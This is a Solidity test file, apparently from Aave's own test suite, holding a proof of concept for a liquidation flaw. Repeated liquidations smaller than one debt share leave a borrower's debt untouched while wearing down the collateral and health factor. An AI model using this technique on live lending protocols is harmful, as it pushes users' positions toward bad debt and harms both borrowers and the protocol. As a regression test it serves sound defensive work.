// SPDX-License-Identifier: UNLICENSED
// Copyright (c) 2025 Aave Labs
pragma solidity ^0.8.0;

import 'tests/unit/Spoke/SpokeBase.t.sol';

/// POC tests for liquidation with 0 restored debt shares
contract SpokeLiqTest is SpokeBase {
  address liquidator;
  function setUp() public override {
    super.setUp();

    updateCollateralFactor(spoke1, _daiReserveId(spoke1), 99_99);
    updateCollateralFactor(spoke1, _wethReserveId(spoke1), 99_99);
    updateCollateralFactor(spoke1, _usdxReserveId(spoke1), 99_99);
    updateCollateralFactor(spoke1, _wbtcReserveId(spoke1), 99_99);

    _updateMaxLiquidationBonus(spoke1, _daiReserveId(spoke1), 100_00);
    _updateMaxLiquidationBonus(spoke1, _wethReserveId(spoke1), 100_00);
    _updateMaxLiquidationBonus(spoke1, _usdxReserveId(spoke1), 100_00);
    _updateMaxLiquidationBonus(spoke1, _wbtcReserveId(spoke1), 100_00);

    _updateLiquidationFee(spoke1, _daiReserveId(spoke1), 100_00);
    _updateLiquidationFee(spoke1, _wethReserveId(spoke1), 100_00);
    _updateLiquidationFee(spoke1, _usdxReserveId(spoke1), 100_00);
    _updateLiquidationFee(spoke1, _wbtcReserveId(spoke1), 100_00);

    _openSupplyPosition(spoke1, _daiReserveId(spoke1), 1e22);
    _openSupplyPosition(spoke1, _wethReserveId(spoke1), MAX_SUPPLY_AMOUNT);
    _openSupplyPosition(spoke1, _usdxReserveId(spoke1), MAX_SUPPLY_AMOUNT);
    _openSupplyPosition(spoke1, _wbtcReserveId(spoke1), MAX_SUPPLY_AMOUNT);

    updateCollateralRisk(spoke1, _wethReserveId(spoke1), 0);
    updateCollateralRisk(spoke1, _usdxReserveId(spoke1), 0);
    updateCollateralRisk(spoke1, _wbtcReserveId(spoke1), 0);
    updateCollateralRisk(spoke1, _daiReserveId(spoke1), 0);

    liquidator = makeAddr('liquidator');
    deal(address(tokenList.dai), liquidator, 1e30);

    vm.prank(liquidator);
    tokenList.dai.approve(address(hub1), MAX_SUPPLY_AMOUNT);
  }

  /// POC test for using restore donations to put user positions closer to possibility of bad debt
  /// by doing multiple liquidations where <1 full debt share is liquidated
  function test_liq_donation() public {
    updateCollateralRisk(spoke1, _wethReserveId(spoke1), 0);
    Utils.supplyCollateral(spoke1, _wethReserveId(spoke1), alice, 100e18, alice);
    _mockInterestRateBps(1_000_00);

    Utils.borrow(spoke1, _daiReserveId(spoke1), alice, 100e18, alice);

    skip(365 days);
    // now debt index is 11

    Utils.supplyCollateral(spoke1, _daiReserveId(spoke1), bob, 1_100e18, bob);
    _borrowToBeAtHf(spoke1, bob, _daiReserveId(spoke1), 0.95e18);

    console.log('bob hf before liquidation %e', spoke1.getUserAccountData(bob).healthFactor);
    console.log('liquidator balance before %e', tokenList.dai.balanceOf(liquidator));

    uint256 numIterations = 100_000;
    uint256[] memory supplyExRate = new uint256[](numIterations);

    uint256 supplySharesBefore = spoke1.getUserSuppliedShares(_daiReserveId(spoke1), bob);
    uint256 debtAmountBefore = spoke1.getUserTotalDebt(_daiReserveId(spoke1), bob);
    uint256 debtAmountSharesBefore = spoke1.getUserPosition(_daiReserveId(spoke1), bob).drawnShares;
    uint256 premiumDebtSharesBefore = spoke1
      .getUserPosition(_daiReserveId(spoke1), bob)
      .premiumShares;

    vm.startPrank(liquidator);
    tokenList.dai.approve(address(hub1), UINT256_MAX);
    for (uint256 i = 0; i < numIterations; i++) {
      spoke1.liquidationCall(_daiReserveId(spoke1), _daiReserveId(spoke1), bob, 10); // liquidate less than 1 full debt share
    }
    vm.stopPrank();

    uint256 supplySharesAfter = spoke1.getUserSuppliedShares(_daiReserveId(spoke1), bob);
    uint256 debtAmountAfter = spoke1.getUserTotalDebt(_daiReserveId(spoke1), bob);
    uint256 debtAmountSharesAfter = spoke1.getUserPosition(_daiReserveId(spoke1), bob).drawnShares;
    uint256 premiumDebtSharesAfter = spoke1
      .getUserPosition(_daiReserveId(spoke1), bob)
      .premiumShares;

    console.log(
      'bob supplied shares before/after liqs %e %e delta: %e',
      supplySharesBefore,
      supplySharesAfter,
      supplySharesBefore - supplySharesAfter
    );
    console.log(
      'bob debt shares before/after liqs %e %e delta: %e',
      debtAmountSharesBefore,
      debtAmountSharesAfter,
      debtAmountSharesBefore - debtAmountSharesAfter
    );
    console.log(
      'bob premium debt shares before/after liqs %e %e delta: %e',
      premiumDebtSharesBefore,
      premiumDebtSharesAfter,
      premiumDebtSharesBefore - premiumDebtSharesAfter
    );
    console.log('bob hf after series of liqs %e', spoke1.getUserAccountData(bob).healthFactor);
    console.log('liquidator balance after %e', tokenList.dai.balanceOf(liquidator));

    /// after liquidations:
    /// bob's debt has decreased by 0
    /// bob's collateral value has reduced
    /// bob's HF has decreased
    /// liquidator balance remains unchanged, but spent gas to execute these actions
  }
}
